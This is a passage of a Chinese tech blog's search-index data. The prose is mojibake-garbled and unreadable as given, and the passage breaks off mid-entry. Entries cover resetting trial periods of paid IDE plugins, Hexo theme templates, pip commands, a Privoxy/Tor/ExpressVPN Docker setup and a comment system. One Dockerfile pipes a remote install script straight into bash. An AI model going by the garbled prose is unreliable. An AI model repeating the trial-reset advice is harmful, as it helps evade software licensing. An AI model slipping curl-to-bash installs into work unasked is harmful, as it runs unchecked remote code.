ä»˜è´¹æ’ä»¶é‡ç½®è¯´æ˜å¸‚åœºä¸Šä»˜è´¹æ’ä»¶çš„è¯•ç”¨ä¿¡æ¯ä¹Ÿä¼šä¸€å¹¶é‡ç½®ï¼ŒMyBatisCodeHelperPro æ’ä»¶æœ‰ä¸¤ä¸ªç‰ˆæœ¬å¦‚ä¸‹ï¼ŒåŠŸèƒ½å®Œå…¨ç›¸åŒï¼Œå®‰è£…æ—¶é¡»çœ‹æ¸…æ¥šï¼š MyBatisCodeHelperPro (Marketplace Edition)ï¼Œå¯é‡ç½®ï¼ MyBatisCodeHelperProï¼Œä¸å¯é‡ç½®ï¼ å¯¹äºæŸäº›ä»˜è´¹æ’ä»¶ï¼ˆå¦‚: Iedis 2, MinBatisï¼‰æ¥è¯´ï¼Œå¯èƒ½éœ€è¦å»é™¤æ‰ javaagent é…ç½®ï¼ˆå¦‚æœæœ‰ï¼‰åå†é‡å¯ IDEï¼š å¦‚æœ IDE æ²¡æœ‰æ‰“å¼€é¡¹ç›®ï¼Œåœ¨ Welcome ç•Œé¢ç‚¹å‡»èœå•ï¼š Configure -&gt; Edit Custom VM Options... -&gt; ç§»é™¤ -javaagent: å¼€å¤´çš„å†…å®¹ å¦‚æœ IDE æ‰“å¼€äº†é¡¹ç›®ï¼Œç‚¹å‡»èœå•ï¼šHelp -&gt; Edit Custom VM Options... -&gt; ç§»é™¤ -javaagent: å¼€å¤´çš„å†…å®¹ é‡ç½®éœ€è¦é‡å¯ IDE æ‰ç”Ÿæ•ˆ var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "å…¨æ ˆæŠ€æœ¯é©¿ç«™", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "type": "hexo", "random": "0.9", "interval": "30", "expires": "365", "height": "auto" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"å¼€å‘å·¥å…·"},{title:"æ„å»º Hexo Next ä¸»é¢˜çš„æºç ",url:"/posts/63112f7b.html",text:'æ ¸å¿ƒæºæ–‡ä»¶å¸ƒå±€æ¨¡æ¿æ–‡ä»¶ /themes/next/layout/_layout.njk /themes/next/layout/_macro/post.njk æ›´æ”¹ Next ä¸»é¢˜çš„æºç NJK æ¨¡ç‰ˆæ–‡ä»¶åˆ¤æ–­æ˜¯å¦ä¸ºé¦–é¡µ1{%- if is_index %} ... {%- endif %} 1{%- if not is_index %} ... {%- endif %} å¼•å…¥è‡ªå®šä¹‰çš„ NJK æ¨¡ç‰ˆæ–‡ä»¶é»˜è®¤ä»¥ /theme/next/layout ä¸ºæ ¹ç›®å½•ï¼Œä¸éœ€è¦ä½¿ç”¨ ../ ç¬¦å·æ¥å¼•ç”¨ä¸Šçº§ç›®å½•ä¸­çš„æ¨¡ç‰ˆæ–‡ä»¶ 1{{ partial(\'_partials/_custom/adsense/post-footer-ads.njk\') }} ä¸‹è¿°è¿™ç§å¼•å…¥æ–¹å¼åªèƒ½å¼•å…¥å½“å‰ç›®å½•ä¸‹ï¼ˆåŒ…æ‹¬å­ç›®å½•ï¼‰çš„æ¨¡ç‰ˆæ–‡ä»¶ï¼Œæ— æ³•ä½¿ç”¨ ../ ç¬¦å·æ¥å¼•ç”¨ä¸Šçº§ç›®å½•ä¸­çš„æ¨¡ç‰ˆæ–‡ä»¶ 1{%- include \'_custom/adsense/post-footer-ads.njk\' -%} NJK æ¨¡ç‰ˆæ–‡ä»¶è·å– Hexo çš„é…ç½®ä¿¡æ¯è·å– Hexo çš„é…ç½®æ–‡ä»¶ _config.yml çš„å†…å®¹ï¼š 1{%- if config.excerpt_description %} ... {%- endif %} æˆ–è€… 123456&lt;div style="text-align:center"&gt; &lt;ins class="ads" style="display:block" data-ad-client="{{ config.adsense.publisher_id }}" data-full-width-responsive="true"&gt;&lt;/ins&gt;&lt;/div&gt; NJK æ¨¡ç‰ˆæ–‡ä»¶è·å– Next çš„é…ç½®ä¿¡æ¯è·å– Next ä¸»é¢˜çš„é…ç½®æ–‡ä»¶ /theme/next/_config.yml çš„å†…å®¹ï¼š 1{%- if theme.excerpt_description %} ... {%- endif %} æˆ–è€… 123456&lt;div style="text-align:center"&gt; &lt;ins class="ads" style="display:block" data-ad-client="{{ theme.adsense.publisher_id }}" data-full-width-responsive="true"&gt;&lt;/ins&gt;&lt;/div&gt; NJK æ¨¡ç‰ˆæ–‡ä»¶è·å–æ–‡ç« çš„ Meta ä¿¡æ¯1{%- if post.description and theme.excerpt_description %} ... {%- endif %} è¦†ç›– Next é»˜è®¤çš„ CSS æ ·å¼123.vpreview p { color: #444 !important;} å–æ¶ˆ Next é»˜è®¤çš„ CSS æ ·å¼123.comments { overflow: unset;} var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "å…¨æ ˆæŠ€æœ¯é©¿ç«™", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "type": "hexo", "random": "0.9", "interval": "30", "expires": "365", "height": "auto" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"é™æ€åšå®¢"},{title:"Python å¸¸ç”¨å‘½ä»¤",url:"/posts/1e59ef45.html",text:'Pip ç®¡ç†æ¨¡å—å•ä¸ªæ›´æ–°æ¨¡å—12345678# åˆ—å‡ºæ‰€æœ‰å·²å®‰è£…çš„æ¨¡å—# pip list# åˆ—å‡ºæ‰€æœ‰è¿‡æœŸçš„æ¨¡å—# pip list --outdated# æ›´æ–°æŒ‡å®šçš„æ¨¡å—# pip install --upgrade requests æ‰¹é‡æ›´æ–°æ¨¡å—12345# å®‰è£…æ›´æ–°å·¥å…·# pip install pip-review# æ‰¹é‡æ›´æ–°æ¨¡å—# pip-review --local --interactive --auto æ‰¹é‡å¸è½½æ¨¡å—12345# åˆ—å‡ºæ‰€æœ‰å·²å®‰è£…çš„æ¨¡å—# pip freeze &gt; py.txt# å¸è½½æ‰€æœ‰å·²å®‰è£…çš„æ¨¡å—# pip uninstall -y -r py.txt var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "å…¨æ ˆæŠ€æœ¯é©¿ç«™", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "type": "hexo", "random": "0.9", "interval": "30", "expires": "365", "height": "auto" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"python"},{title:"æ„å»º Privoxyã€Torã€ExpressVPN çš„ Docker é•œåƒ",url:"/posts/3fe8dbc5.html",text:'å‰è¨€æ•™ç¨‹ç›®æ ‡æ„å»ºé›†æˆäº† Privoxyã€Torã€ExpressVPNã€SpeedTest æœåŠ¡çš„ Docker é•œåƒï¼Œæ”¯æŒä½¿ç”¨ SpeedTest æµ‹è¯• ExpressVPN çš„è¿æ¥é€Ÿåº¦ã€‚Docker é•œåƒæ„å»ºæˆåŠŸåï¼Œå¯ä»¥åˆ©ç”¨ Privoxy ä¸ Tor åœ¨ ExpressVPN çš„åŸºç¡€ä¸Šï¼Œå®ç°æ™®é€šä»£ç†ä¸åŒ¿åä»£ç†æœåŠ¡ã€‚ é¡¹ç›®åœ°å€ expressvpn-privoxy-tor æ„å»ºé•œåƒDockerfile æ–‡ä»¶Dockerfile æ–‡ä»¶çš„å†…å®¹å¦‚ä¸‹ï¼Œæ ¸å¿ƒå†…å®¹æ˜¯å®‰è£… Privoxyã€Torã€ExpressVPNï¼Œå¹¶æŒ‡å®š Privoxy ä¸ Tor çš„ç›‘å¬ç«¯å£ 123456789101112131415161718192021222324252627FROM debian:bullseye-slimLABEL maintainer="benjamin@polkaned.net"ENV ACTIVATION_CODE CodeENV LOCATION smartARG APP=expressvpn_3.25.0.13-1_amd64.debRUN apt-get update &amp;&amp; apt-get install -y --no-install-recommends \\ wget curl apt-utils apt-transport-https dirmngr ca-certificates expect iproute2 procps libnm0 gnupg2 tor privoxy \\ &amp;&amp; rm -rf /var/lib/apt/lists/* \\ &amp;&amp; wget -q "https://www.expressvpn.works/clients/linux/${APP}" -O /tmp/${APP} \\ &amp;&amp; dpkg -i /tmp/${APP} \\ &amp;&amp; rm -rf /tmp/*.deb \\ &amp;&amp; apt-get purge -y --auto-remove wget \\ &amp;&amp; sed -i \\ -e \'s/#SocksPort 192.168.0.1:9100/SocksPort 0.0.0.0:9050/g\' \\ -e \'s/#ControlPort 9051/ControlPort 9052/g\' \\ /etc/tor/torrc \\ &amp;&amp; sed -i \\ -e \'s/listen-address\\s*127.0.0.1:8118/listen-address 0.0.0.0:8118/g\' \\ /etc/privoxy/configCOPY entrypoint.sh /tmp/entrypoint.shCOPY expressvpnActivate.sh /tmp/expressvpnActivate.shENTRYPOINT ["/bin/bash", "/tmp/entrypoint.sh"] Shell è„šæœ¬æ–‡ä»¶entrypoint.sh æ–‡ä»¶çš„å†…å®¹å¦‚ä¸‹ï¼š 12345678910111213#!/usr/bin/bashservice tor startservice privoxy startcp /etc/resolv.conf /tmp/resolv.confsu -c \'umount /etc/resolv.conf\'cp /tmp/resolv.conf /etc/resolv.confsed -i \'s/DAEMON_ARGS=.*/DAEMON_ARGS=""/\' /etc/init.d/expressvpnservice expressvpn restart/usr/bin/expect /tmp/expressvpnActivate.shexpressvpn connect $SERVERexec "$@" expressvpnActivate.sh æ–‡ä»¶çš„å†…å®¹å¦‚ä¸‹ï¼š 1234567#!/usr/bin/expectspawn expressvpn activateexpect "code:"send "$env(ACTIVATION_CODE)\\r"expect "information."send "n\\r"expect eof æ„å»º Docker é•œåƒç”±äºè¿™é‡Œéœ€è¦ä»å®˜ç½‘ä¸‹è½½ ExpressVPN çš„å®‰è£…åŒ…ï¼Œå› æ­¤æ„å»º Docker é•œåƒæ—¶ï¼Œå¿…é¡»ä¿è¯å¯ä»¥ç§‘å­¦ä¸Šç½‘ï¼Œå¦åˆ™æ— æ³•æ­£å¸¸æ„å»ºé•œåƒã€‚æ¸©é¦¨æç¤ºï¼Œè‹¥æ— æ³•æä¾›ç§‘å­¦ä¸Šç½‘çš„æ¡ä»¶ï¼Œå¯å‚è€ƒè¿™é‡Œçš„æ–¹æ¡ˆæ¥è§£å†³ã€‚ 1# docker build --pull --no-cache --rm --force-rm -f Dockerfile -t polkaned/privoxy-tor-expressvpn:latest . è¿è¡Œå®¹å™¨Docker è¿è¡Œå®¹å™¨ {% your-activation-code %}ï¼šExpressVPN çš„æ¿€æ´»ç ï¼Œä¾‹å¦‚ ACTIVATION_CODE=ABCD1EBGH2IJAL3MNOP4QRS {% LOCATION/ALIAS/COUNTRY %}ï¼šExpressVPN çš„è¿æ¥ä½ç½®ï¼Œä¾‹å¦‚ SERVER=jpyoï¼Œè‹¥ä¸ºç©ºå€¼åˆ™é»˜è®¤ä½¿ç”¨ ExpressVPN çš„æ™ºèƒ½ä½ç½® 1234567891011121314docker run \\ --env=ACTIVATION_CODE={% your-activation-code %} \\ --env=SERVER={% LOCATION/ALIAS/COUNTRY %} \\ --cap-add=NET_ADMIN \\ --device=/dev/net/tun \\ --privileged \\ --detach=true \\ --tty=true \\ -p 9050:9050 \\ -p 9052:9052 \\ -p 8118:8118 \\ --name=expressvpn \\ polkaned/privoxy-tor-expressvpn \\ /bin/bash Docker-Compose è¿è¡Œå®¹å™¨docker-compose.yml æ–‡ä»¶çš„å†…å®¹å¦‚ä¸‹ï¼š 12345678910111213141516171819202122version: "3.5"services: expressvpn: container_name: expressvpn image: polkaned/privoxy-tor-expressvpn:latest privileged: true restart: always environment: - ACTIVATION_CODE={% your-activation-code %} - SERVER={% LOCATION/ALIAS/COUNTRY %} cap_add: - NET_ADMIN devices: - /dev/net/tun ports: - 9050:9050 - 9052:9052 - 8118:8118 tty: true stdin_open: true command: /bin/bash è‹¥å…¶ä»–å®¹å™¨éœ€è¦ä½¿ç”¨ ExpressVPNï¼Œé‚£ä¹ˆå¯ä»¥å‚è€ƒä»¥ä¸‹é…ç½®å†…å®¹ï¼š 1234567891011121314151617181920212223242526272829version: "3.5"services: expressvpn: container_name: expressvpn image: polkaned/privoxy-tor-expressvpn:latest privileged: true restart: always environment: - ACTIVATION_CODE={% your-activation-code %} - SERVER={% LOCATION/ALIAS/COUNTRY %} cap_add: - NET_ADMIN devices: - /dev/net/tun ports: - 9050:9050 - 9052:9052 - 8118:8118 tty: true stdin_open: true command: /bin/bash downloader: image: example/downloader container_name: downloader network_mode: service:expressvpn depends_on: - expressvpn é€šè¿‡ Docker-Compose åˆ›å»ºå¹¶å¯åŠ¨ Docker å®¹å™¨ 12345# åˆ›å»ºå¹¶å¯åŠ¨å®¹å™¨# docker-compose up -d# æŸ¥çœ‹å®¹å™¨çš„æ—¥å¿—ä¿¡æ¯# docker logs -f --tail 20 expressvpn æµ‹è¯• Privoxy ä¸ Tor ä»£ç†æ˜¯å¦å¯ç”¨12345# æµ‹è¯•Privoxy$ curl -I -x 127.0.0.1:8118 www.google.com# æµ‹è¯•Tor$ curl --socks5 127.0.0.1:9050 www.google.com è¿›é˜¶é…ç½®Privoxy ä»£ç† Torï¼ˆå¯é€‰ï¼‰è‹¥å¸Œæœ› Privoxy ä»£ç† Torï¼Œå¯ä»¥åœ¨ /etc/privoxy/config é…ç½®æ–‡ä»¶çš„æœ«å°¾æ·»åŠ ä»¥ä¸‹å†…å®¹ï¼š 1forward-socks5 / 0.0.0.0:9050 . é™åˆ¶è¯·æ±‚æ¥æºçš„ IPï¼ˆå¯é€‰ï¼‰è‹¥å¸Œæœ›é™åˆ¶è®¿é—® Privoxy ä»£ç†æœåŠ¡çš„ IPï¼Œå³æ–°å¢ IP ç™½åå•ï¼Œåˆ™å¯ä»¥åœ¨ /etc/privoxy/config é…ç½®æ–‡ä»¶çš„æœ«å°¾æ·»åŠ ä»¥ä¸‹å†…å®¹ï¼š 123456# ç¼–è¾‘é…ç½®æ–‡ä»¶ï¼ŒIPéœ€è¦æ ¹æ®å®é™…æƒ…å†µè¿›è¡Œæ›´æ”¹# vim /etc/privoxy/configpermit-access 14.215.177.38/26# é‡å¯å®¹å™¨è®©é…ç½®å˜æ›´ç”Ÿæ•ˆ# docker restart expressvpn æŒ‚è½½æœ¬åœ°é…ç½®æ–‡ä»¶ï¼ˆå¯é€‰ï¼‰1ï¼‰å¯åŠ¨ Docker å®¹å™¨åï¼Œåˆ†åˆ«æ‹·è´ä¸€ä»½ Privoxyã€Tor çš„é…ç½®æ–‡ä»¶åˆ°å®¿ä¸»æœºçš„æœ¬åœ°ç£ç›˜ 1234567# åˆ›å»ºå®¿ä¸»æœºæœ¬åœ°çš„é…ç½®æ–‡ä»¶ç›®å½•# mkdir -p /usr/local/tor# mkdir -p /usr/local/privoxy# æ‹·è´å®¹å™¨é‡Œçš„é…ç½®æ–‡ä»¶åˆ°å®¿ä¸»æœºçš„æœ¬åœ°ç£ç›˜# docker cp expressvpn:/etc/tor/torrc /usr/local/tor/torrc# docker cp expressvpn:/etc/privoxy/config /usr/local/privoxy/config 2ï¼‰åˆ›å»º Privoxy çš„ user.action é…ç½®æ–‡ä»¶ï¼Œç”¨äºé˜»æ­¢ Privoxy æŒ‡å‘æœåŠ¡å™¨æœ¬èº«çš„ IP å’ŒåŸŸåï¼Œè¿™é‡Œè¯·æ›¿æ¢ä¸ºä½ è‡ªå·±çœŸå®æœåŠ¡å™¨çš„ IP å’ŒåŸŸå 12345# åˆ›å»ºæ–‡ä»¶$ touch /usr/local/privoxy/user.action# å†™å…¥ä»¥ä¸‹å†…å®¹åˆ°æ–‡ä»¶ä¸­$ vim /usr/local/privoxy/user.action 12{+block{block ip and domain which point to server itself}}127.0.0.1 3ï¼‰åˆ›å»º Privoxy çš„ user.filter é…ç½®æ–‡ä»¶ï¼Œç”¨äºå­˜æ”¾ Privoxy çš„è¿‡æ»¤è§„åˆ™ï¼Œæš‚æ—¶ä¸éœ€è¦å¡«å†™ä»»ä½•å†…å®¹ 1$ touch /usr/local/privoxy/user.filter 4ï¼‰æ›´æ”¹ docker-compose.yml æ–‡ä»¶ï¼Œæ·»åŠ æ•°æ®å·çš„é…ç½®å†…å®¹ï¼ˆå¦‚ä¸‹æ‰€ç¤ºï¼‰ 123456789101112131415161718192021222324252627version: "3.5"services: expressvpn: container_name: expressvpn image: polkaned/privoxy-tor-expressvpn:latest privileged: true restart: always environment: - ACTIVATION_CODE={% your-activation-code %} - SERVER={% LOCATION/ALIAS/COUNTRY %} cap_add: - NET_ADMIN devices: - /dev/net/tun ports: - 9050:9050 - 9052:9052 - 8118:8118 volumes: - /usr/local/tor/torrc:/etc/privoxy/torrc - /usr/local/privoxy/config:/etc/privoxy/config - /usr/local/privoxy/user.action:/etc/privoxy/user.action - /usr/local/privoxy/user.filter:/etc/privoxy/user.filter tty: true stdin_open: true command: /bin/bash VPN ç®¡ç†ExpressVPN å¸¸ç”¨ç®¡ç†å‘½ä»¤123456789101112131415161718192021# ä¼˜åŒ–ExpressVPNçš„é…ç½®# docker exec -it expressvpn expressvpn protocol lightway_udp# docker exec -it expressvpn expressvpn preferences set desktop_notifications false# æŸ¥çœ‹ExpressVPçš„é…ç½®ä¿¡æ¯# docker exec -it expressvpn expressvpn preferences# æŸ¥çœ‹ExpressVPNçš„è¿æ¥çŠ¶æ€# docker exec -it expressvpn expressvpn status# æŸ¥çœ‹ExpressVPNçš„å¯è¿æ¥åœ°åŒº# docker exec -it expressvpn expressvpn list# è¿æ¥VPNï¼ˆæ™ºèƒ½è¿æ¥ï¼‰# docker exec -it expressvpn expressvpn connect# è¿æ¥VPNï¼Œå¹¶æŒ‡å®šè¿æ¥çš„åœ°åŒº# docker exec -it expressvpn expressvpn connect jpyo# æ–­å¼€VPNè¿æ¥# docker exec -it expressvpn expressvpn disconnect VPN æµ‹é€ŸExpressVPN ä½¿ç”¨ SpeedTest æµ‹é€Ÿè‹¥å¸Œæœ›æµ‹è¯• ExpressVPN çš„è¿æ¥é€Ÿåº¦ï¼Œåˆ™å¯ä»¥å®‰è£… SpeedTest æ¥å®ç°ï¼Œæ›´æ”¹åå®Œæ•´çš„ Dockerfile å¦‚ä¸‹ï¼š 1234567891011121314151617181920212223242526272829FROM debian:bullseye-slimLABEL maintainer="benjamin@polkaned.net"ENV ACTIVATION_CODE CodeENV LOCATION smartARG APP=expressvpn_3.18.1.0-1_amd64.debRUN apt-get update &amp;&amp; apt-get install -y --no-install-recommends \\ wget curl apt-utils apt-transport-https dirmngr ca-certificates expect iproute2 procps libnm0 gnupg2 tor privoxy \\ &amp;&amp; rm -rf /var/lib/apt/lists/* \\ &amp;&amp; wget -q "https://www.expressvpn.works/clients/linux/${APP}" -O /tmp/${APP} \\ &amp;&amp; dpkg -i /tmp/${APP} \\ &amp;&amp; rm -rf /tmp/*.deb \\ &amp;&amp; apt-get purge -y --auto-remove wget \\ &amp;&amp; sed -i \\ -e \'s/#SocksPort 192.168.0.1:9100/SocksPort 0.0.0.0:9050/g\' \\ -e \'s/#ControlPort 9051/ControlPort 9052/g\' \\ /etc/tor/torrc \\ &amp;&amp; sed -i \\ -e \'s/listen-address\\s*127.0.0.1:8118/listen-address 0.0.0.0:8118/g\' \\ /etc/privoxy/config \\ &amp;&amp; curl -s https://install.speedtest.net/app/cli/install.deb.sh | bash \\ &amp;&amp; apt-get install speedtestCOPY entrypoint.sh /tmp/entrypoint.shCOPY expressvpnActivate.sh /tmp/expressvpnActivate.shENTRYPOINT ["/bin/bash", "/tmp/entrypoint.sh"] ä½¿ç”¨å‘½ä»¤è¡Œæµ‹è¯• ExpressVPN çš„è¿æ¥é€Ÿåº¦ï¼š 12345# æµ‹é€Ÿ# docker exec -it expressvpn speedtest# æµ‹é€Ÿï¼Œå¹¶æŒ‡å®šç½‘é€Ÿçš„æ˜¾ç¤ºå•ä½# docker exec -it expressvpn speedtest -u kB/s SpeedTest æ”¯æŒæ˜¾ç¤ºçš„ç½‘é€Ÿå•ä½å¦‚ä¸‹ï¼š 1234Decimal prefix, bits per second: bps, kbps, Mbps, GbpsDecimal prefix, bytes per second: B/s, kB/s, MB/s, GB/sBinary prefix, bits per second: kibps, Mibps, GibpsBinary prefix, bytes per second: kiB/s, MiB/s, GiB/s å¸¸è§é—®é¢˜ExpressVPN ç‰ˆæœ¬æ›´æ–°è‹¥æ—¥åå¸Œæœ›æ›´æ–° ExpressVPN çš„ç‰ˆæœ¬ï¼Œåªéœ€è¦æ‰§è¡Œä»¥ä¸‹ä¸¤æ­¥æ“ä½œå³å¯ï¼š 1ï¼‰æ›´æ”¹ Dockerfile é‡Œ ExpressVPN å®‰è£…åŒ…çš„æ–‡ä»¶å 1234FROM debian:bullseye-slim...ARG APP=expressvpn_3.18.1.0-1_amd64.deb... 2ï¼‰é‡æ–°æ„å»º Docker é•œåƒ 1# docker build --pull --no-cache --rm --force-rm -f Dockerfile -t polkaned/privoxy-tor-expressvpn:latest . Chrome æµè§ˆå™¨ä½¿ç”¨ Privoxy ä»£ç†è‹¥å¸Œæœ› Chrome æµè§ˆå™¨æ™ºèƒ½åˆ‡æ¢è‡³ Docker + ExpressVPN + Privoxy/Tor æä¾›çš„ä»£ç†æœåŠ¡ï¼ˆå®ç°å›½å†…å¤–æµé‡åˆ†æµåŠŸèƒ½ï¼‰ï¼Œå¯ä»¥å®‰è£… SwitchyOmega æµè§ˆå™¨æ’ä»¶æ¥å®ç°ï¼Œå…·ä½“ä½¿ç”¨æ–¹å¼è¿™é‡Œä¸å†ç´¯è¿°ï¼Œæ›´å¤šèµ„æ–™å¯å‚è€ƒä»¥ä¸‹é“¾æ¥ï¼š Proxy SwitchyOmega çš„é¡¹ç›®åœ°å€ Proxy SwitchyOmega çš„ Chrome åº”ç”¨å•†åº—å®‰è£…åœ°å€ æ„å»º Docker é•œåƒæ—¶æ— æ³•ç§‘å­¦ä¸Šç½‘åœ¨ä¸Šé¢çš„æ•™ç¨‹é‡Œï¼Œå¿…é¡»ä¿è¯å¯ä»¥ç§‘å­¦ä¸Šç½‘æ‰èƒ½æ­£å¸¸æ„å»º Docker é•œåƒã€‚ç‰¹æ®Šæƒ…å†µä¸‹ï¼Œå¯èƒ½æ— æ³•æä¾›ç§‘å­¦ä¸Šç½‘çš„æ¡ä»¶ï¼Œæ­¤æ—¶å¯ä»¥é€šè¿‡å…¶ä»–é€”å¾„æ‰‹åŠ¨ä¸‹è½½ ExpressVPN æœ€æ–°ç‰ˆæœ¬çš„ Debian/Ubuntu å®‰è£…åŒ…ï¼Œå¹¶å°†å®‰è£…åŒ…é‡å‘½åä¸º expressvpn_amd64.debï¼Œç„¶åæ›´æ”¹ä¸Šé¢çš„ Dockerfile çš„å†…å®¹ï¼ˆå¦‚ä¸‹æ‰€ç¤ºï¼‰ï¼Œè¿™æ ·å°±å¯ä»¥ç›´æ¥æ„å»º Docker é•œåƒï¼Œä¸å†éœ€è¦ä¾èµ–ç§‘å­¦ä¸Šç½‘äº†ã€‚ 12345678910111213141516171819202122232425FROM debian:bullseye-slimLABEL maintainer="benjamin@polkaned.net"ENV ACTIVATION_CODE CodeENV LOCATION smartCOPY expressvpn_amd64.deb /tmp/expressvpn_amd64.debRUN dpkg -i /tmp/expressvpn_amd64.deb &amp;&amp; rm -rf /tmp/expressvpn_amd64.debRUN apt-get update &amp;&amp; apt-get install -y --no-install-recommends \\ curl apt-utils apt-transport-https dirmngr ca-certificates expect iproute2 procps libnm0 gnupg2 tor privoxy \\ &amp;&amp; rm -rf /var/lib/apt/lists/* \\ &amp;&amp; sed -i \\ -e \'s/#SocksPort 192.168.0.1:9100/SocksPort 0.0.0.0:9050/g\' \\ -e \'s/#ControlPort 9051/ControlPort 9052/g\' \\ /etc/tor/torrc \\ &amp;&amp; sed -i \\ -e \'s/listen-address\\s*127.0.0.1:8118/listen-address 0.0.0.0:8118/g\' \\ /etc/privoxy/configCOPY entrypoint.sh /tmp/entrypoint.shCOPY expressvpnActivate.sh /tmp/expressvpnActivate.shENTRYPOINT ["/bin/bash", "/tmp/entrypoint.sh"] å‚è€ƒèµ„æ–™ Tor Privoxy ExpressVPN Dockerfiles Docker å®‰è£… Privoxy ä»£ç†æœåŠ¡ Centos7 å®‰è£… ExpressVPN å®¢æˆ·ç«¯ var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "å…¨æ ˆæŠ€æœ¯é©¿ç«™", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "type": "hexo", "random": "0.9", "interval": "30", "expires": "365", "height": "auto" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"å®¹å™¨åŒ– å¼€å‘å·¥å…·"},{title:"Hexo Next ä¸»é¢˜ä½¿ç”¨ Waline è¯„è®ºç³»ç»Ÿ",url:"/posts/ae18fb85.html",text:'å‰è¨€æœ¬æ•™ç¨‹çš„å†…å®¹è™½ç„¶ä¼šæŒç»­æ›´æ–°ï¼Œä½†ä¸€åˆ‡å†…å®¹ä»¥ Waline å®˜æ–¹æ–‡æ¡£ ä¸ºå‡†ã€‚ ç‰ˆæœ¬è¯´æ˜ è½¯ä»¶ ç‰ˆæœ¬ æè¿° linux CentOS 7.9 docker 20.10.5 mysql 5.7.26 node 14.17.3 hexo 5.4.0 next 8.12.1 waline-admin 0.18.0 waline-client 2.5.1 waline-server 1.18.5 Hexo è¯„è®ºç³»ç»Ÿé€‰æ‹©Hexo å„ç±»è¯„è®ºç³»ç»Ÿçš„å¯¹æ¯”å¯çœ‹è¿™é‡Œï¼Œä¹‹å‰åšå®¢ä¸€ç›´ä½¿ç”¨çš„è¯„è®ºç³»ç»Ÿæ˜¯åŸºäº Github Issue çš„ Utterancesã€‚ç”±äº Utterances é»˜è®¤æ²¡æœ‰ CDN åŠ é€Ÿï¼Œç»å¸¸é€ æˆé¡µé¢åŠ è½½å®Œæˆåæ— æ³•æ­£å¸¸æ˜¾ç¤º Utterances çš„è¯„è®ºåŒºï¼Œè€Œä¸”éœ€ç”¨ç”¨æˆ·ç™»å½• Github è´¦å·æ‰èƒ½è¯„è®ºï¼Œå› æ­¤æ‰“ç®—æ›´æ¢åšå®¢çš„è¯„è®ºç³»ç»Ÿã€‚å›½å¤–çš„ Disqusã€Hypercomments æš‚æ—¶ä¸è€ƒè™‘ï¼Œå›½å†…è®¿é—®è¢«å¢™çš„æ¦‚ç‡å¾ˆå¤§ã€‚Gitmentã€Gitalkã€Gitter å’Œ Utterances ä¸€æ ·ï¼Œè®¿é—®é€Ÿåº¦ä¸å¤ªç¨³å®šï¼Œä¸”ç™»å½• Github æ‰èƒ½è¯„è®ºï¼Œæš‚æ—¶ä¹Ÿä¸è€ƒè™‘ã€‚è¿™ä¸€æ³¢æ’é™¤ä¸‹æ¥ï¼Œå‰©ä¸‹çš„æ–¹æ¡ˆåªæœ‰ Valineã€Issoã€Waline æˆ–è€… è‡ªå»ºè¯„è®ºç³»ç»Ÿã€‚è€ƒè™‘åˆ° Valine ä¾èµ– Leancloud ç¬¬ä¸‰æ–¹æœåŠ¡ï¼Œä¸”éœ€è¦åœ¨ Leancloud é¢å¤–éƒ¨ç½² Valine Admin æ‰èƒ½å®ç°é‚®ä»¶é€šçŸ¥ä¸è¯„è®ºç®¡ç†ç­‰åŠŸèƒ½ï¼Œè¿™æ ·ä¸€æ¥æ„Ÿè§‰ä¹Ÿä¸é è°±ï¼Œä¸‡ä¸€ Leancloud ä»¥åé€€å‡ºå•†ä¸šå¸‚åœºç«äº‰å‘¢ï¼Ÿç»¼åˆè€ƒè™‘ä¸‹æ¥ï¼Œæœ€ç»ˆé€‰æ‹©äº† Waline è¯„è®ºç³»ç»Ÿï¼Œä¸€æ¬¾ä» Valine è¡ç”Ÿçš„å¸¦åç«¯è¯„è®ºç³»ç»Ÿï¼Œæ”¯æŒå¤šç§éƒ¨ç½²æ–¹å¼å’Œæ•°æ®å­˜å‚¨æ–¹å¼ï¼Œè¿™æ ·å°±å¯ä»¥çœå» è‡ªå»ºè¯„è®ºç³»ç»Ÿ çš„å¼€å‘æˆæœ¬ï¼ŒåŒæ—¶ä¹Ÿå¯ä»¥å°½é‡å°‘ä¾èµ–ç¬¬ä¸‰æ–¹æœåŠ¡ï¼Œå¢åŠ æ—¥åæ‰©å±•å’Œç»´æŠ¤çš„è‡ªç”±åº¦ã€‚ Hexo è¯„è®ºç³»ç»Ÿä»‹ç»Valine è¯„è®ºç³»ç»ŸValine æ˜¯ä¸€æ¬¾åŸºäº Leancloud çš„å¿«é€Ÿã€ç®€æ´ä¸”é«˜æ•ˆçš„æ— 